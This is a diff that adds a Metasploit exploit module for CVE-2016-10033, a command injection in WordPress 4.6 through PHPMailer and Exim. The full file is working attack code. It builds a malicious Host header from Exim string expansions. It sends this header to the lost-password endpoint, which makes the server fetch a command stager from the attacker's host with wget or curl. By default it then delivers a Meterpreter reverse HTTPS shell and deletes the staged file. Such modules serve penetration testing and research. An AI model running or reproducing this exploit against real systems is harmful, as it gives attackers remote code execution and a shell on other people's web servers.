@@ -1,0 +1,197 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = AverageRanking
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'                => 'WordPress PHPMailer Host Header Command Injection',
+      'Description'         => %q{
+        This module exploits a command injection vulnerability in WordPress
+        version 4.6 with Exim as an MTA via a spoofed Host header to PHPMailer,
+        a mail-sending library that is bundled with WordPress.
+
+        A valid WordPress username is required to exploit the vulnerability.
+        Additionally, due to the altered Host header, exploitation is limited to
+        the default virtual host, assuming the header isn't mangled in transit.
+
+        If the target is running Apache 2.2.32 or 2.4.24 and later, the server
+        may have HttpProtocolOptions set to Strict, preventing a Host header
+        containing parens from passing through, making exploitation unlikely.
+      },
+      'Author'              => [
+        'Dawid Golunski', # Vulnerability discovery
+        'wvu'             # Metasploit module
+      ],
+      'References'          => [
+        ['CVE', '2016-10033'],
+        ['URL', 'https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html'],
+        ['URL', 'http://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html'],
+        ['URL', 'https://httpd.apache.org/docs/2.4/mod/core.html#httpprotocoloptions']
+      ],
+      'DisclosureDate'      => 'May 3 2017',
+      'License'             => MSF_LICENSE,
+      'Platform'            => 'linux',
+      'Arch'                => [ARCH_X86, ARCH_X64],
+      'Privileged'          => false,
+      'Targets'             => [
+        ['WordPress 4.6 / Exim', {}]
+      ],
+      'DefaultTarget'       => 0,
+      'DefaultOptions'      => {
+        'PAYLOAD'           => 'linux/x64/meterpreter_reverse_https',
+        'CMDSTAGER::FLAVOR' => 'wget'
+      },
+      'CmdStagerFlavor'     => ['wget', 'curl']
+    ))
+
+    register_options([
+      OptString.new('USERNAME', [true, 'WordPress username', 'admin'])
+    ])
+
+    register_advanced_options([
+      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])
+    ])
+
+    deregister_options('VHOST', 'URIPATH')
+  end
+
+  def check
+    if (version = wordpress_version)
+      version = Gem::Version.new(version)
+    else
+      return CheckCode::Safe
+    end
+
+    vprint_status("WordPress #{version} installed at #{full_uri}")
+
+    if version <= Gem::Version.new('4.6')
+      CheckCode::Appears
+    else
+      CheckCode::Detected
+    end
+  end
+
+  def exploit
+    if check == CheckCode::Safe
+      print_error("Is WordPress installed at #{full_uri} ?")
+      return
+    end
+
+    # Since everything goes through strtolower(), we need lowercase
+    print_status("Generating #{cmdstager_flavor} command stager")
+    @cmdstager = generate_cmdstager(
+      'Path'   => "/#{Rex::Text.rand_text_alpha_lower(8)}",
+      :temp    => datastore['WritableDir'],
+      :file    => File.basename(cmdstager_path),
+      :nospace => true
+    ).join(';')
+
+    print_status("Generating and sending Exim prestager")
+    generate_prestager.each do |command|
+      vprint_status("Sending #{command}")
+      send_request_payload(command)
+    end
+  end
+
+  #
+  # Exploit methods
+  #
+
+  # Absolute paths are required for prestager commands due to execve(2)
+  def generate_prestager
+    prestager = []
+
+    # This is basically sh -c `wget` implemented using Exim string expansions
+    # Badchars we can't encode away: \ for \n (newline) and : outside strings
+    prestager << '/bin/sh -c ${run{/bin/echo}{${extract{-1}{$value}' \
+      "{${readsocket{inet:#{srvhost_addr}:#{srvport}}" \
+      "{get #{get_resource} http/1.0$value$value}}}}}}"
+
+    # CmdStager should rm the file, but it blocks on the payload, so we do it
+    prestager << "/bin/rm -f #{cmdstager_path}"
+  end
+
+  def send_request_payload(command)
+    res = send_request_cgi(
+      'method'        => 'POST',
+      'uri'           => wordpress_url_login,
+      'headers'       => {
+        'Host'        => generate_exim_payload(command)
+      },
+      'vars_get'      => {
+        'action'      => 'lostpassword'
+      },
+      'vars_post'     => {
+        'user_login'  => datastore['USERNAME'],
+        'redirect_to' => '',
+        'wp-submit'   => 'Get New Password'
+      }
+    )
+
+    if res && !res.redirect?
+      if res.code == 200 && res.body.include?('login_error')
+        fail_with(Failure::NoAccess, 'WordPress username may be incorrect')
+      elsif res.code == 400 && res.headers['Server'] =~ /^Apache/
+        fail_with(Failure::NotVulnerable, 'HttpProtocolOptions may be Strict')
+      else
+        fail_with(Failure::UnexpectedReply, "Server returned code #{res.code}")
+      end
+    end
+
+    res
+  end
+
+  def generate_exim_payload(command)
+    exim_payload  = Rex::Text.rand_text_alpha(8)
+    exim_payload << "(#{Rex::Text.rand_text_alpha(8)} "
+    exim_payload << "-be ${run{#{encode_exim_payload(command)}}}"
+    exim_payload << " #{Rex::Text.rand_text_alpha(8)})"
+  end
+
+  # We can encode away the following badchars using string expansions
+  def encode_exim_payload(command)
+    command.gsub(/[\/ :]/,
+      '/' => '${substr{0}{1}{$spool_directory}}',
+      ' ' => '${substr{10}{1}{$tod_log}}',
+      ':' => '${substr{13}{1}{$tod_log}}'
+    )
+  end
+
+  #
+  # Utility methods
+  #
+
+  def cmdstager_flavor
+    datastore['CMDSTAGER::FLAVOR']
+  end
+
+  def cmdstager_path
+    @cmdstager_path ||=
+      "#{datastore['WritableDir']}/#{Rex::Text.rand_text_alpha_lower(8)}"
+  end
+
+  #
+  # Override methods
+  #
+
+  # Return CmdStager on first request, payload on second
+  def on_request_uri(cli, request)
+    if @cmdstager
+      print_good("Sending #{@cmdstager}")
+      send_response(cli, @cmdstager)
+      @cmdstager = nil
+    else
+      print_good("Sending payload #{datastore['PAYLOAD']}")
+      super
+    end
+  end
+
+end
